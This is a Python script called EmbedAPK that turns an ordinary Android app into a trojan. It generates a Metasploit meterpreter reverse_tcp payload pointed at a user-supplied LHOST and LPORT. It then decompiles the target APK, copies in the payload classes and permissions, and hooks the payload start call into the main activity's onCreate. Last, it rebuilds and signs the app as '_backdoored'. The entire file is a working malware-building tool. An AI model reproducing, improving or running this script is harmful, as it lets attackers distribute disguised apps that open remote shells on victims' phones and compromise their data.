import os
import re
print"#######                                #    ######  #    #" 
print"#       #    # #####  ###### #####    # #   #     # #   #"  
print"#       ##  ## #    # #      #    #  #   #  #     # #  #"   
print"#####   # ## # #####  #####  #    # #     # ######  ###"    
print"#       #    # #    # #      #    # ####### #       #  #"   
print"#       #    # #    # #      #    # #     # #       #   #"  
print"####### #    # #####  ###### #####  #     # #       #    #\n"
print"Welcome To EmbedAPK --- Krishnaprasadh.R\n"
localhost=raw_input("Enter LHOST (IP)   : ")
localport=raw_input("Enter LPORT (PORT) : ")
command="msfvenom -p android/meterpreter/reverse_tcp LHOST="+localhost+" LPORT="+localport+" -o ./virus.apk"
print(command)
os.system(command)
sourceapk=raw_input("Enter APK filename to be backdoored (filename.apk): ")
command="java -jar ./apktool.jar d "+sourceapk+" -o sourceapk"
#print(command)
os.system(command)
command="java -jar ./apktool.jar d virus.apk -o virusapk"
#print(command)
os.system(command)
command="mkdir ./sourceapk/smali/com >/dev/null 2>&1"
os.system(command)
command="cp -r ./virusapk/smali/com/metasploit ./sourceapk/smali/com/metasploit/"
os.system(command)
#ExtractPermissions
f = open('./virusapk/AndroidManifest.xml')
f1 = open('./virusapk/tocopy.xml', 'w')
for line in f.readlines():
    if '<uses-permission' in line:
        f1.write(line)
f1.close()
f.close()
#InjectPermissions
f  = open('./sourceapk/AndroidManifest.xml')
f1 = open('./virusapk/tocopy.xml')
f2 = open('./sourceapk/final.xml','w')
for line in f.readlines():
    f2.write(line)
    if '<uses-permission' in line:
        for line1 in f1.readlines():
		f2.write(line1)
f2.close()
f1.close()
f.close()
os.system("rm ./virusapk/tocopy.xml")
os.system("rm ./sourceapk/AndroidManifest.xml")
os.system("mv ./sourceapk/final.xml ./sourceapk/AndroidManifest.xml")
#locate hooks
f1 = open("./sourceapk/AndroidManifest.xml", "r")
f2 = open("./sourceapk/activityhooks.txt","w")
regex = re.compile(r'"[^"]*"')
for line in f1:
	if 'android:name=' and 'activity android:' in line:
    		quotes = regex.findall(line)
    		for word in quotes:
        		#print word
			f2.write(word+'\n')
f2.close()
f1.close()
f1 = open("./sourceapk/AndroidManifest.xml", "r")
f2 = open("./sourceapk/packagehooks.txt","w")
regex = re.compile(r'"[^"]*"')
for line in f1:
	if 'package=' in line:
    		quotes = regex.findall(line)
    		for word in quotes:
        		#print word
			f2.write(word+'\n')
f2.close()
f1.close()
print("==========================================AVAILABLE ACTIVITIES TO HOOK=======================================================")
print("-----------------------------------------------------------------------------------------------------------------------------")
#command="cat ./sourceapk/activityhooks.txt"
command="cat ./sourceapk/activityhooks.txt | grep com"
os.system(command)
command="cat ./sourceapk/activityhooks.txt | grep package"
os.system(command)
print("-----------------------------------------------------------------------------------------------------------------------------")
print("AVAILABLE PACKAGES TO HOOK (RARELY USED) -- If package.x.x.main in AVAILABLE ACTIVITES use the below packages with full activity path")
print("Eg: Available Activity -> pacakge.mainactivity | Available Package -> com.filemanager | so hook location = com.filemanager.mainactivity")
print("-----------------------------------------------------------------------------------------------------------------------------")
command="cat ./sourceapk/packagehooks.txt"
os.system(command)
print("-----------------------------------------------------------------------------------------------------------------------------")
hook=raw_input("Enter hook location (Usually MainActivity) - CaseSensitive (com.x.x) or (package.x.x): ")
#print(hook)
hook = hook.replace(".", "/")
#print(hook)
command="rm ./sourceapk/activityhooks.txt"
os.system(command)
command="rm ./sourceapk/packagehooks.txt"
os.system(command)
command="./sourceapk/smali/"+hook+".smali"
#print(command)
smalifile= hook.split('/')
#print("smalifile="+smalifile[-1])
smalipath= hook.rsplit('/',1)[0]
#print("smalipath="+smalipath)
#os.system(command)
activityhook="    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
f1 = open(command, "r")
buf= f1.readlines()	#buffer
f2 = open("./sourceapk/smali/"+smalipath+"/smalifile.smali", "w")
for line in buf:
	#condition="true"
	if "->onCreate(Landroid/os/Bundle;)V" in line:		#if line == "something"
		#if condition=="true":
			f2.write(line)
			f2.write('\n')
			f2.write(activityhook)
			f2.write('\n')
	else:
		f2.write(line)
f2.close()
f1.close()
command="rm ./sourceapk/smali/"+hook+".smali"
os.system(command)
command="mv ./sourceapk/smali/"+smalipath+"/smalifile.smali ./sourceapk/smali/"+smalipath+"/"+smalifile[-1]+".smali"
#print("rename path="+command)
os.system(command)
command="java -jar ./apktool.jar b sourceapk -o ./sourceapk.apk"
os.system(command)
command="rm -r sourceapk/ && rm -r virusapk/ && rm ./virus.apk"
os.system(command)
command="java -jar signapk.jar certificate.pem key.pk8 ./sourceapk.apk sourceapksigned.apk"
os.system(command)
os.system("rm ./sourceapk.apk")
sourceapk=sourceapk.split('.')
command="mv ./sourceapksigned.apk ./"+sourceapk[0]+"_backdoored."+sourceapk[-1]
os.system(command)
print("DONE! Ready For Testing ===> "+sourceapk[0]+"_backdoored."+sourceapk[-1])
